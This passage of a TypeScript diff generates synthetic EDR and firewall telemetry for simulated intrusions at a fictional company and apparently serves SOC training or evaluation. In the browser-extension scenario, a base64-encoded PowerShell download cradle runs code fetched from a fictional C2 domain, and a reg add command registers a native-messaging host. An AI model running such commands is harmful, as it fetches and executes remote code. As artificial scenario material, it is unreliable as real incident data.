-        "crowdstrike.sensor.id": "9e296c8f274095bd2eb96eb0c7247dad",
-        "crowdstrike.network_containment_state": "Not Contained",
         "event.action": "process_created",
         "process.pid": "6624",
-        "process.executable": "C:\\Users\\r.avraham\\Downloads\\Delivery_Notice_48213.pdf.exe",
+        "process.executable": exePath,
         "process.name": "Delivery_Notice_48213.pdf.exe",
-        "process.command_line": "\"C:\\Users\\r.avraham\\Downloads\\Delivery_Notice_48213.pdf.exe\"",
+        "process.command_line": `"${exePath}"`,
         "process.hash.sha256": fileHash,
         "process.signed": "false",
         "process.code_signature.status": "unsigned",
@@ -6457,20 +6341,42 @@ export function phishingMalwareScenarioEvents() {
       },
     },
     {
+      // The endpoint side of the connection: the process, its hash and the URL it reached.
+      id: "evt_pm_02b_connect", ts: T(6 * MIN + 44_000),
+      source: "edr", vendor: "CrowdStrike Falcon", event_type: "net_connection",
+      hostname: victim.hostname, user_email: victim.email,
+      src_ip: victim.ip, dst_ip: c2Ip, dst_port: 443, src_port: 51204, protocol: "tcp",
+      severity: "high", mitre_technique: "T1071.001",
+      network: { domain: c2Domain },
+      process: {
+        name: "Delivery_Notice_48213.pdf.exe", pid: 6624, parent_name: "explorer.exe", parent_pid: 3140,
+        path: exePath, user: "NEXACORP\\r.avraham", integrity: "medium", hash: { sha256: fileHash },
+      },
+      description: `Delivery_Notice_48213.pdf.exe on WS-HR-1182 connected to ${c2Domain} (${c2Ip}) on port 443.`,
+      raw: {
+        "crowdstrike.event_simpleName": "NetworkConnectIP4",
+        "destination.ip": c2Ip, "destination.port": "443", "destination.domain": c2Domain,
+        "source.ip": victim.ip, "source.port": "51204",
+        "process.name": "Delivery_Notice_48213.pdf.exe", "process.hash.sha256": fileHash,
+        "host.name": victim.hostname, "user.name": "NEXACORP\\r.avraham",
+      },
+    },
+    {
+      // First page for the SOC: URL filtering alert on the newly registered domain.
       id: "evt_pm_03_beacon", ts: T(6 * MIN + 45_000),
       source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "net_connection",
       hostname: victim.hostname, user_email: victim.email,
-      src_ip: victim.ip, dst_ip: c2Ip, dst_port: 443, protocol: "tcp",
+      src_ip: victim.ip, dst_ip: c2Ip, dst_port: 443, src_port: 51204, protocol: "tcp",
       severity: "high", mitre_technique: "T1071.001",
       network: { bytes_out: 4608, bytes_in: 51200, domain: c2Domain },
-      description: "WS-HR-1182 opened an outbound HTTPS session to shiptrack-updates-net.xyz, which the firewall's URL filtering categorises as a newly registered domain; the firewall allowed the session.",
+      description: "The firewall's URL filtering logged an alert for an HTTPS session from WS-HR-1182 to shiptrack-updates-net.xyz, categorised as a newly registered domain; the session was allowed.",
       raw: {
         "event.action": "network-connection-allowed", "event.outcome": "success",
         "source.ip": victim.ip, "source.port": "51204",
         "destination.ip": c2Ip, "destination.port": "443",
         "network.protocol": "tcp", "network.transport": "tcp",
         "network.application": "ssl",
-        "pan.app": "ssl", "pan.action": "allow", "pan.rule": "ALLOW-OUTBOUND-HTTPS",
+        "pan.app": "ssl", "pan.action": "alert", "pan.rule": "Outbound-Web-Users",
         "network.bytes_out": "4608", "network.bytes_in": "51200",
         "dns.query_domain": c2Domain,
         "url.category": "newly-registered-domain",
@@ -6482,26 +6388,37 @@ export function phishingMalwareScenarioEvents() {
       source: "edr", vendor: "CrowdStrike Falcon", event_type: "av_quarantine",
       hostname: victim.hostname, user_email: victim.email,
       severity: "critical", mitre_technique: "T1204.002",
-      file: { path: "C:\\Users\\r.avraham\\Downloads\\Delivery_Notice_48213.pdf.exe", sha256: fileHash, size: 391168 },
-      description: "CrowdStrike Falcon classified Delivery_Notice_48213.pdf.exe on WS-HR-1182 as malicious, killed the running process and quarantined the file — three minutes after it had already executed and contacted the C2 domain.",
+      file: { path: exePath, sha256: fileHash, size: 391168 },
+      process: {
+        name: "Delivery_Notice_48213.pdf.exe", pid: 6624, parent_name: "explorer.exe", parent_pid: 3140,
+        path: exePath, user: "NEXACORP\\r.avraham", integrity: "medium", hash: { sha256: fileHash },
+      },
+      description: "The EDR terminated Delivery_Notice_48213.pdf.exe on WS-HR-1182 and quarantined the file, about three minutes after the process started and two minutes after its connection to shiptrack-updates-net.xyz.",
       raw: {
         "crowdstrike.event_simpleName": "DetectionSummaryEvent",
-        "crowdstrike.detection.id": "ldt:37a7bf65f9703d4bb6257bab115ba2f3:2234567891",
+        "threat.name": "Trojan:MSIL/AgentTesla!MTB",
         "crowdstrike.detection.tactic": "Execution",
         "crowdstrike.detection.tactic_id": "TA0002",
         "crowdstrike.detection.technique": "User Execution: Malicious File",
         "crowdstrike.detection.technique_id": "T1204.002",
-        "crowdstrike.detection.pattern_disposition": "2304",
-        "crowdstrike.detection.pattern_disposition_description": "Prevention, Quarantine File",
+        "crowdstrike.detection.pattern_disposition_description": "Prevention, Kill Process, Quarantine File",
         "crowdstrike.detection.severity": "Critical",
         "process.hash.sha256": fileHash,
         "host.name": victim.hostname,
-        "action_result": "quarantined",
+        "action_result": "process_killed, quarantined",
       },
+    },
+    {
+      id: "evt_pm_05_zap", ts: T(11 * MIN),
+      source: "email_gateway", vendor: "Microsoft Defender for Office 365", event_type: "email_quarantined",
+      user_email: victim.email,
+      severity: "medium", mitre_technique: "T1566.001",
+      description: "Zero-hour auto purge (ZAP) moved the \"Your Package Could Not Be Delivered\" message from r.avraham's inbox to quarantine with a Malware verdict.",
+      raw: { ...mail, "Action": "Moved to quarantine", "ActionTrigger": "ZAP", "ActionResult": "Success", "ThreatTypes": "Malware", "DeliveryLocation": "Quarantine" },
     },
   ];
 
-  return { title: "Phishing Attachment → Malware Execution → Workstation Compromise", events, T, MIN, c2Domain, c2Ip, fileHash };
+  return { title: "Shipping-Notice ZIP Attachment → Disguised .pdf.exe → Workstation Infection", events, T, MIN, c2Domain, c2Ip, fileHash, zipHash };
 }
 
 /** Telemetry half of `buildUsbMalwareScenario`: the events and the story title, no answer key. */
@@ -6512,8 +6429,33 @@ export function usbMalwareScenarioEvents() {
 
   const victim = { hostname: "WS-OPS-2214", email: "m.levi@nexacorp.com", ip: "10.10.55.19" };
   const fileHash = makeSha256("usb_backup_tool_exe_trojan_dropper");
+  const usbSerial = "4C530001071117107564";
+  // Story-specific infrastructure (no other storyline uses this address).
+  const c2Domain = "sync-winbackup.net";
+  const c2Ip = "91.215.85.17";
 
   const events: TelemetryEvent[] = [
+    {
+      // The USB mount itself — the device identity (serial, product) that ties the
+      // drive to the executable copied off it in the next row.
+      id: "evt_usb_00_mount", ts: T(-1 * MIN),
+      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
+      hostname: victim.hostname, user_email: victim.email,
+      severity: "low", mitre_technique: "T1091",
+      description: "A removable USB drive (SanDisk Cruzer, serial 4C530001071117107564) was mounted as E:\\ on WS-OPS-2214.",
+      raw: {
+        "crowdstrike.event_simpleName": "RemovableMediaVolumeMounted",
+        "event.action": "RemovableMediaVolumeMounted",
+        "usb.action": "mounted",
+        "usb.mount_point": "E:\\",
+        "usb.device.name": "SanDisk Cruzer Blade",
+        "usb.vendor": "SanDisk",
+        "usb.device.serial": usbSerial,
+        "removable_media.type": "USB Flash Drive",
+        "user.name": "NEXACORP\\m.levi",
+        "host.name": victim.hostname,
+      },
+    },
     {
       id: "evt_usb_01_copy", ts: T(0),
       source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
@@ -6525,7 +6467,7 @@ export function usbMalwareScenarioEvents() {
         name: "explorer.exe", pid: 3140, path: "C:\\Windows\\explorer.exe",
         user: "NEXACORP\\m.levi", integrity: "medium",
       },
-      description: "USB_Backup_Tool.exe was copied from a removable USB drive (E:\\) to the Desktop on WS-OPS-2214.",
+      description: "USB_Backup_Tool.exe was copied from the removable drive (E:\\) to the Desktop on WS-OPS-2214.",
       raw: {
         "crowdstrike.event_simpleName": "NewExecutableWritten",
         "event.action": "file_written",
@@ -6536,7 +6478,7 @@ export function usbMalwareScenarioEvents() {
         "file.source_volume_type": "removable",
         "file.hash.sha256": fileHash,
         "file.signed": "false",
-        "device.removable_media.serial": "07A3F9C1",
+        "device.removable_media.serial": usbSerial,
         "user.name": "NEXACORP\\m.levi",
         "host.name": victim.hostname,
       },
@@ -6608,27 +6550,49 @@ export function usbMalwareScenarioEvents() {
       },
     },
     {
+      // A beacon before the kill — gives containment an indicator (domain + IP) beyond the file hash.
+      id: "evt_usb_03b_beacon", ts: T(3 * MIN + 50_000),
+      source: "edr", vendor: "CrowdStrike Falcon", event_type: "net_connection",
+      hostname: victim.hostname, user_email: victim.email,
+      src_ip: victim.ip, dst_ip: c2Ip, dst_port: 443, src_port: 52140, protocol: "tcp",
+      severity: "high", mitre_technique: "T1071.001",
+      network: { domain: c2Domain },
+      process: {
+        name: "USB_Backup_Tool.exe", pid: 7712, path: "C:\\Users\\m.levi\\Desktop\\USB_Backup_Tool.exe",
+        parent_name: "explorer.exe", parent_pid: 3140, user: "NEXACORP\\m.levi", integrity: "medium", hash: { sha256: fileHash },
+      },
+      description: `USB_Backup_Tool.exe on WS-OPS-2214 connected to ${c2Domain} (${c2Ip}) on port 443.`,
+      raw: {
+        "crowdstrike.event_simpleName": "NetworkConnectIP4",
+        "destination.ip": c2Ip, "destination.port": "443", "destination.domain": c2Domain,
+        "source.ip": victim.ip, "source.port": "52140",
+        "process.name": "USB_Backup_Tool.exe", "process.hash.sha256": fileHash,
+        "host.name": victim.hostname, "user.name": "NEXACORP\\m.levi",
+      },
+    },
+    {
       id: "evt_usb_04_detect", ts: T(5 * MIN),
       source: "edr", vendor: "CrowdStrike Falcon", event_type: "av_quarantine",
       hostname: victim.hostname, user_email: victim.email,
       severity: "critical", mitre_technique: "T1547.001",
       file: { path: "C:\\Users\\m.levi\\Desktop\\USB_Backup_Tool.exe", sha256: fileHash, size: 245760 },
-      description: "CrowdStrike Falcon classified USB_Backup_Tool.exe on WS-OPS-2214 as malicious, killed the running process and quarantined the file. The detection does not show the HKCU Run value being removed, so the analyst must confirm and clean up the SystemBackupSvc value.",
+      description: "The EDR terminated USB_Backup_Tool.exe on WS-OPS-2214 and quarantined the file; the detection does not record the HKCU\\...\\Run SystemBackupSvc value being removed.",
       raw: {
         "crowdstrike.event_simpleName": "DetectionSummaryEvent",
+        "threat.name": "Trojan:Win32/Wacatac.B!ml",
         "crowdstrike.detection.technique": "Boot or Logon Autostart Execution: Registry Run Keys",
         "crowdstrike.detection.technique_id": "T1547.001",
         "crowdstrike.detection.pattern_disposition": "2304",
-        "crowdstrike.detection.pattern_disposition_description": "Prevention, Quarantine File",
+        "crowdstrike.detection.pattern_disposition_description": "Prevention, Kill Process, Quarantine File",
         "crowdstrike.detection.severity": "Critical",
         "process.hash.sha256": fileHash,
         "host.name": victim.hostname,
-        "action_result": "quarantined",
+        "action_result": "process_killed, quarantined",
       },
     },
   ];
 
-  return { title: "Malicious USB Drive → Trojan Persistence → Workstation Compromise", events, T, MIN, fileHash };
+  return { title: "Malicious USB Drive → Trojan Persistence → Workstation Compromise", events, T, MIN, fileHash, c2Domain, c2Ip };
 }
 
 /** Telemetry half of `buildBrowserExtensionMalwareScenario`: the events and the story title, no answer key. */
@@ -6639,14 +6603,69 @@ export function browserExtensionMalwareScenarioEvents() {
 
   const victim = { hostname: "WS-MKT-3301", email: "d.cohen@nexacorp.com", ip: "10.10.62.18" };
   const c2Domain = "cdn-assets-update.xyz";
-  const c2Ip = "185.220.101.77";
+  // Story-specific infrastructure (no other storyline uses this address).
+  const c2Ip = "172.86.75.90";
+  const dlDomain = "perf-boost-extension.net";
+  const dlIp = "38.180.24.51";
   const stagerHash = makeSha256("browser_ext_stage2_payload");
+  const zipHash = makeSha256("perf_boost_ext_unpacked_zip");
   const extId = "affloghcebbkcmnolgfhbiphpnbekoj";
-  const nmHostCmd = "C:\\Users\\d.cohen\\Downloads\\perf_boost_ext_unpacked\\host\\perf_boost_host.cmd";
+  const extDir = "C:\\Users\\d.cohen\\Downloads\\perf_boost_ext_unpacked";
+  const nmHostCmd = `${extDir}\\host\\perf_boost_host.cmd`;
+  const nmManifest = `${extDir}\\host\\com.perfboost.host.json`;
   // https payload, so the decoded URL scheme/port match the firewall egress (443).
   const encodedCmd = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAGEAcwBzAGUAdABzAC0AdQBwAGQAYQB0AGUALgB4AHkAegAvAGIALgBwAHMAMQAnACkA";
 
   const events: TelemetryEvent[] = [
+    {
+      // How the extension arrived: chrome downloaded a ZIP from a lure site, then
+      // the unpacked folder (with its native-messaging manifest) appeared in Downloads.
+      id: "evt_bext_00a_download", ts: T(-6 * MIN),
+      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
+      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
+      severity: "low", mitre_technique: "T1176.001",
+      file: { path: `${extDir}.zip`, sha256: zipHash, size: 112640 },
+      process: {
+        name: "chrome.exe", pid: 8816, path: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+        user: "NEXACORP\\d.cohen", integrity: "medium",
+      },
+      description: `chrome.exe on WS-MKT-3301 downloaded perf_boost_ext_unpacked.zip from ${dlDomain} to d.cohen's Downloads folder.`,
+      raw: {
+        "crowdstrike.event_simpleName": "ZipFileWritten",
+        "file.path": `${extDir}.zip`,
+        "file.hash.sha256": zipHash,
+        "FileOriginUrl": `https://${dlDomain}/perf_boost_ext_unpacked.zip`,
+        "FileOriginReferrerUrl": `https://${dlDomain}/install`,
+        "host.name": victim.hostname, "user.name": "NEXACORP\\d.cohen",
+      },
+    },
+    {
+      // The native-messaging host registration — the HKCU key that makes Chrome
+      // willing to launch the host executable. Without this the launch below is impossible.
+      id: "evt_bext_00b_nmreg", ts: T(-4 * MIN),
+      source: "edr", vendor: "CrowdStrike Falcon", event_type: "registry_set",
+      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
+      severity: "medium", mitre_technique: "T1176.001",
+      process: {
+        name: "cmd.exe", pid: 7004, parent_name: "explorer.exe", parent_pid: 3140,
+        cmdline: `cmd.exe /c reg add "HKCU\\Software\\Google\\Chrome\\NativeMessagingHosts\\com.perfboost.host" /ve /d "${nmManifest}" /f`,
+        user: "NEXACORP\\d.cohen", integrity: "medium",
+      },
+      registry: {
+        path: "HKCU\\Software\\Google\\Chrome\\NativeMessagingHosts\\com.perfboost.host\\(Default)",
+        key: "(Default)",
+        value: nmManifest,
+      },
+      description: "A Chrome NativeMessagingHosts registration for com.perfboost.host was written under HKCU on WS-MKT-3301, pointing at a manifest in d.cohen's Downloads folder.",
+      raw: {
+        "crowdstrike.event_simpleName": "RegGenericValueUpdate",
+        "registry.path": "HKCU\\Software\\Google\\Chrome\\NativeMessagingHosts\\com.perfboost.host\\(Default)",
+        "registry.key": "(Default)",
+        "registry.value": nmManifest,
+        "process.name": "cmd.exe",
+        "host.name": victim.hostname, "user.name": "NEXACORP\\d.cohen",
+      },
+    },
     {
       id: "evt_bext_01_sideload", ts: T(0),
       source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
@@ -6743,18 +6762,39 @@ export function browserExtensionMalwareScenarioEvents() {
       src_ip: victim.ip, dst_ip: c2Ip, dst_port: 443, protocol: "tcp",
       severity: "high", mitre_technique: "T1071.001",
       network: { bytes_out: 3072, bytes_in: 40960, domain: c2Domain },
-      description: "WS-MKT-3301 opened an outbound HTTPS connection to cdn-assets-update.xyz, which the firewall's URL filtering categorises as a newly registered domain; the firewall allowed the session.",
+      description: "The firewall's URL filtering logged an alert for an HTTPS session from WS-MKT-3301 to cdn-assets-update.xyz, categorised as a newly registered domain; the session was allowed.",
       raw: {
         "event.action": "network-connection-allowed", "event.outcome": "success",
         "source.ip": victim.ip, "source.port": "53718",
         "destination.ip": c2Ip, "destination.port": "443",
         "network.protocol": "tcp", "network.transport": "tcp",
         "network.application": "ssl",
-        "pan.app": "ssl", "pan.action": "allow", "pan.rule": "ALLOW-OUTBOUND-HTTPS",
+        "pan.app": "ssl", "pan.action": "alert", "pan.rule": "Outbound-Web-Users",
         "network.bytes_out": "3072", "network.bytes_in": "40960",
         "dns.query_domain": c2Domain,
         "url.category": "newly-registered-domain",
         "action_result": "allow",
+      },
+    },
+    {
+      // What the download cradle did before it was killed: wrote a second-stage script
+      // to %TEMP%, giving the analyst the stage-2 artifact and hash.
+      id: "evt_bext_04b_drop", ts: T(2 * MIN + 45_000),
+      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
+      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
+      severity: "high", mitre_technique: "T1105",
+      file: { path: "C:\\Users\\d.cohen\\AppData\\Local\\Temp\\b.ps1", sha256: stagerHash, size: 40960 },
+      process: {
+        name: "powershell.exe", pid: 9024, parent_name: "cmd.exe", parent_pid: 9020,
+        path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        user: "NEXACORP\\d.cohen", integrity: "medium",
+      },
+      description: "powershell.exe on WS-MKT-3301 wrote b.ps1 (40 KB) to d.cohen's %TEMP% folder.",
+      raw: {
+        "crowdstrike.event_simpleName": "NewScriptWritten",
+        "file.path": "C:\\Users\\d.cohen\\AppData\\Local\\Temp\\b.ps1",
+        "file.hash.sha256": stagerHash,
+        "host.name": victim.hostname, "user.name": "NEXACORP\\d.cohen",
       },
     },
     {
@@ -6769,9 +6809,10 @@ export function browserExtensionMalwareScenarioEvents() {
         cmdline: `powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand ${encodedCmd}`,
         user: "NEXACORP\\d.cohen",
       },
-      description: "CrowdStrike Falcon killed the encoded PowerShell process on WS-MKT-3301, flagging the browser → native-host → PowerShell download-cradle chain.",
+      description: "The EDR terminated the encoded PowerShell process on WS-MKT-3301 that had been spawned through the browser native-messaging host.",
       raw: {
         "crowdstrike.event_simpleName": "DetectionSummaryEvent",
+        "crowdstrike.detection.scenario": "suspicious_powershell_download_cradle",
         "crowdstrike.detection.tactic": "Execution",
         "crowdstrike.detection.tactic_id": "TA0002",
         "crowdstrike.detection.technique": "Command and Scripting Interpreter: PowerShell",
@@ -6779,14 +6820,13 @@ export function browserExtensionMalwareScenarioEvents() {
         "crowdstrike.detection.pattern_disposition": "2048",
         "crowdstrike.detection.pattern_disposition_description": "Prevention, process killed.",
         "crowdstrike.detection.severity": "Critical",
-        "crowdstrike.behaviors": "Script host spawned by a browser native-messaging host|Encoded download cradle|Process terminated",
         "host.name": victim.hostname,
         "action_result": "process_killed",
       },
     },
   ];
 
-  return { title: "Sideloaded Browser Extension → Native-Messaging Host → PowerShell", events, T, MIN, c2Domain, c2Ip, stagerHash };
+  return { title: "Sideloaded Browser Extension → Native-Messaging Host → PowerShell", events, T, MIN, c2Domain, c2Ip, stagerHash, dlDomain, dlIp, zipHash };
 }
 
 /** Telemetry half of `buildTechSupportScamScenario`: the events and the story title, no answer key. */
@@ -6798,8 +6838,32 @@ export function techSupportScamScenarioEvents() {
   const victim = { hostname: "WS-ACC-4477", email: "t.mizrahi@nexacorp.com", ip: "10.10.71.29" };
   const toolHash = makeSha256("anydesk_portable_binary_legit_signed");
   const relayIp = "188.34.183.60"; // AnyDesk relay (Hetzner range), outbound 443
+  const relayHost = "relay-a7f3c1.net.anydesk.com";
+  const scamSite = "ms-support-alert.live";
+  const scamIp = "154.216.17.39";
+  const peerId = "1 581 927 344"; // incoming AnyDesk ID of the caller
+  const peerIp = "102.89.44.17";  // caller's internet IP (from the connection trace)
 
   const events: TelemetryEvent[] = [
+    {
+      // The lure: the scareware page the user was sent to, which told them to call and install AnyDesk.
+      id: "evt_rat_00_lure", ts: T(-3 * MIN),
+      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "http_request",
+      hostname: victim.hostname, user_email: victim.email,
+      src_ip: victim.ip, dst_ip: scamIp, dst_port: 443, protocol: "tcp",
+      severity: "medium",
+      network: { url: `https://${scamSite}/alert/call-support`, domain: scamSite, method: "GET" },
+      description: `WS-ACC-4477 loaded ${scamSite}/alert/call-support, which the firewall categorises as a scam/potentially-malicious page.`,
+      raw: {
+        "event.action": "network-connection-allowed", "event.outcome": "success",
+        "source.ip": victim.ip, "source.port": "51990",
+        "destination.ip": scamIp, "destination.port": "443",
+        "network.application": "ssl", "pan.app": "web-browsing", "pan.action": "alert",
+        "url.full": `https://${scamSite}/alert/call-support`,
+        "url.category": "scam",
+        "action_result": "allow",
+      },
+    },
     {
       id: "evt_rat_01_download", ts: T(0),
       source: "edr", vendor: "SentinelOne", event_type: "file_create",
@@ -6818,6 +6882,8 @@ export function techSupportScamScenarioEvents() {
         "file.hash.sha256": toolHash,
         "file.signed": "true",
         "file.signer": "philandro Software GmbH",
+        "FileOriginUrl": "https://download.anydesk.com/AnyDesk.exe",
+        "FileOriginReferrerUrl": `https://${scamSite}/alert/call-support`,
         "user.name": "NEXACORP\\t.mizrahi",
         "host.name": victim.hostname,
       },
@@ -6827,9 +6893,10 @@ export function techSupportScamScenarioEvents() {
       source: "edr", vendor: "SentinelOne", event_type: "process_create",
       hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
       severity: "high", mitre_technique: "T1219.002",
-      description: "t.mizrahi launched AnyDesk.exe on WS-ACC-4477 at the caller's instruction; explorer.exe was the parent process.",
+      description: "t.mizrahi launched AnyDesk.exe on WS-ACC-4477; explorer.exe was the parent process.",
       process: {
         name: "AnyDesk.exe", pid: 5212, parent_name: "explorer.exe", parent_pid: 3140,
+        path: "C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe",
         cmdline: "\"C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe\"",
         user: "NEXACORP\\t.mizrahi", integrity: "medium",
         hash: { sha256: toolHash },
@@ -6842,6 +6909,7 @@ export function techSupportScamScenarioEvents() {
         "process.executable": "C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe",
         "process.command_line": "\"C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe\"",
         "process.parent.name": "explorer.exe",
+        "process.hash.sha256": toolHash,
         "file.signed": "true",
         "user.name": "NEXACORP\\t.mizrahi",
         "host.name": victim.hostname,
@@ -6852,22 +6920,24 @@ export function techSupportScamScenarioEvents() {
       id: "evt_rat_03_relay", ts: T(4 * MIN + 40_000),
       source: "edr", vendor: "SentinelOne", event_type: "net_connection",
       hostname: victim.hostname, user_email: victim.email,
-      src_ip: victim.ip, dst_ip: relayIp, dst_port: 443, protocol: "tcp",
+      src_ip: victim.ip, dst_ip: relayIp, dst_port: 443, src_port: 52118, protocol: "tcp",
       severity: "medium", mitre_technique: "T1219.002",
-      network: { domain: "relay.anydesk.com", bytes_out: 81920, bytes_in: 614400 },
-      description: "AnyDesk.exe on WS-ACC-4477 opened an outbound session to an AnyDesk relay (relay.anydesk.com); the caller now has interactive control of the desktop over that relay.",
+      network: { domain: relayHost, bytes_out: 81920, bytes_in: 614400 },
+      description: `AnyDesk.exe on WS-ACC-4477 opened an outbound session to an AnyDesk relay (${relayHost}).`,
       process: {
         name: "AnyDesk.exe", pid: 5212, parent_name: "explorer.exe", parent_pid: 3140,
+        path: "C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe",
         cmdline: "\"C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe\"",
-        user: "NEXACORP\\t.mizrahi",
+        user: "NEXACORP\\t.mizrahi", hash: { sha256: toolHash },
       },
       raw: {
         "s1.eventType": "IP Connect",
         "process.name": "AnyDesk.exe",
         "process.pid": "5212",
+        "process.hash.sha256": toolHash,
         "source.ip": victim.ip, "source.port": "52118",
         "destination.ip": relayIp, "destination.port": "443",
-        "destination.domain": "relay.anydesk.com",
+        "destination.domain": relayHost,
         "network.protocol": "tcp", "network.transport": "tcp",
         "network.direction": "outbound",
         "user.name": "NEXACORP\\t.mizrahi",
@@ -6876,11 +6946,37 @@ export function techSupportScamScenarioEvents() {
       },
     },
     {
+      // The AnyDesk trace file names the incoming session's ID and the remote peer's IP —
+      // the only record that identifies the caller.
+      id: "evt_rat_03b_trace", ts: T(4 * MIN + 55_000),
+      source: "edr", vendor: "SentinelOne", event_type: "file_modify",
+      hostname: victim.hostname, user_email: victim.email,
+      severity: "medium", mitre_technique: "T1219.002",
+      file: { path: "C:\\Users\\t.mizrahi\\AppData\\Roaming\\AnyDesk\\connection_trace.txt", size: 2048 },
+      process: {
+        name: "AnyDesk.exe", pid: 5212, parent_name: "explorer.exe", parent_pid: 3140,
+        path: "C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe",
+        user: "NEXACORP\\t.mizrahi", hash: { sha256: toolHash },
+      },
+      description: `AnyDesk recorded an incoming interactive session (ID ${peerId}, remote address ${peerIp}) in its connection_trace.txt on WS-ACC-4477.`,
+      raw: {
+        "s1.eventType": "File Modification",
+        "file.path": "C:\\Users\\t.mizrahi\\AppData\\Roaming\\AnyDesk\\connection_trace.txt",
+        "anydesk.incoming_id": peerId,
+        "anydesk.remote_address": peerIp,
+        "anydesk.direction": "Incoming",
+        "process.name": "AnyDesk.exe",
+        "process.hash.sha256": toolHash,
+        "user.name": "NEXACORP\\t.mizrahi",
+        "host.name": victim.hostname,
+      },
+    },
+    {
       id: "evt_rat_04_shell", ts: T(4 * MIN + 90_000),
       source: "edr", vendor: "SentinelOne", event_type: "process_create",
       hostname: victim.hostname, user_email: victim.email,
       severity: "medium", mitre_technique: "T1059.003",
-      description: "While the AnyDesk session was live, explorer.exe on WS-ACC-4477 started cmd.exe, which ran basic system and network enumeration commands.",
+      description: "While the AnyDesk session was live, explorer.exe on WS-ACC-4477 started cmd.exe, which ran systeminfo and netstat.",
       process: {
         name: "cmd.exe", pid: 5540, parent_name: "explorer.exe", parent_pid: 3140,
         cmdline: "cmd.exe /c systeminfo & netstat -ano",
@@ -6898,12 +6994,42 @@ export function techSupportScamScenarioEvents() {
       },
     },
     {
+      // Post-session action: the operator installs AnyDesk as a service for unattended access.
+      id: "evt_rat_04b_install", ts: T(5 * MIN + 40_000),
+      source: "edr", vendor: "SentinelOne", event_type: "service_install",
+      hostname: victim.hostname, user_email: victim.email,
+      severity: "high", mitre_technique: "T1543.003",
+      description: "AnyDesk was installed as a Windows service (AnyDesk) on WS-ACC-4477, which keeps it running for unattended access after the user logs off.",
+      process: {
+        name: "AnyDesk.exe", pid: 6020, parent_name: "services.exe", parent_pid: 836,
+        path: "C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe",
+        user: "NT AUTHORITY\\SYSTEM", integrity: "system", hash: { sha256: toolHash },
+      },
+      raw: {
+        "s1.eventType": "Service Installation",
+        "service.name": "AnyDesk",
+        "service.start_type": "2",
+        "service.account": "LocalSystem",
+        "process.name": "AnyDesk.exe",
+        "process.executable": "C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe",
+        "process.hash.sha256": toolHash,
+        "process.parent.name": "services.exe",
+        "host.name": victim.hostname,
+      },
+    },
+    {
       id: "evt_rat_05_detect", ts: T(6 * MIN),
-      source: "edr", vendor: "SentinelOne", event_type: "av_quarantine",
+      source: "edr", vendor: "SentinelOne", event_type: "edr_alert",
       hostname: victim.hostname, user_email: victim.email,
       severity: "critical", mitre_technique: "T1219.002",
+      is_detection: true,
       file: { path: "C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe", sha256: toolHash, size: 4192256 },
-      description: "SentinelOne killed AnyDesk.exe on WS-ACC-4477 after flagging it as an unapproved remote-access tool with a live external relay session and hands-on-keyboard enumeration.",
+      process: {
+        name: "AnyDesk.exe", pid: 5212, parent_name: "explorer.exe", parent_pid: 3140,
+        path: "C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe",
+        user: "NEXACORP\\t.mizrahi", hash: { sha256: toolHash },
+      },
+      description: "SentinelOne raised a behavioural alert for an unsanctioned remote-access tool (AnyDesk) with a live external relay session on WS-ACC-4477 and terminated its processes.",
       raw: {
         "s1.eventType": "Threats",
         "s1.detection.classification": "PUA",
@@ -6921,7 +7047,7 @@ export function techSupportScamScenarioEvents() {
     },
   ];
 
-  return { title: "Tech-Support Scam → Unapproved Remote Access Tool", events, T, MIN, toolHash };
+  return { title: "Tech-Support Scam → Unapproved Remote Access Tool", events, T, MIN, toolHash, scamSite, scamIp, relayHost, relayIp, peerId };
 }
 
 /** Telemetry half of `buildCrackedSoftwareScenario`: the events and the story title, no answer key. */
@@ -6932,28 +7058,61 @@ export function crackedSoftwareScenarioEvents() {
 
   const victim = { hostname: "WS-ENG-2093", email: "y.golan@nexacorp.com", ip: "10.10.48.55" };
   const downloadDomain = "fast-office-tools-download.top";
+  // Story-specific infrastructure (no other storyline uses these addresses).
+  const downloadIp = "103.224.182.47";
+  const c2Domain = "office-license-check.info";
+  const c2Ip = "45.95.147.62";
   const installerHash = makeSha256("office_activator_setup_installer");
   const payloadHash = makeSha256("cracked_installer_dropped_payload");
+  const installerPath = "C:\\Users\\y.golan\\Downloads\\Office_Pro_2026_Activator_Setup.exe";
+  const svchelperPath = "C:\\ProgramData\\OfficeTools\\svchelper.exe";
 
   const events: TelemetryEvent[] = [
     {
       id: "evt_crack_01_download", ts: T(0),
-      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "net_connection",
+      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "http_request",
       hostname: victim.hostname, user_email: victim.email,
-      src_ip: victim.ip, dst_ip: "141.98.80.212", dst_port: 443, protocol: "tcp",
+      src_ip: victim.ip, dst_ip: downloadIp, dst_port: 443, protocol: "tcp",
       severity: "low",
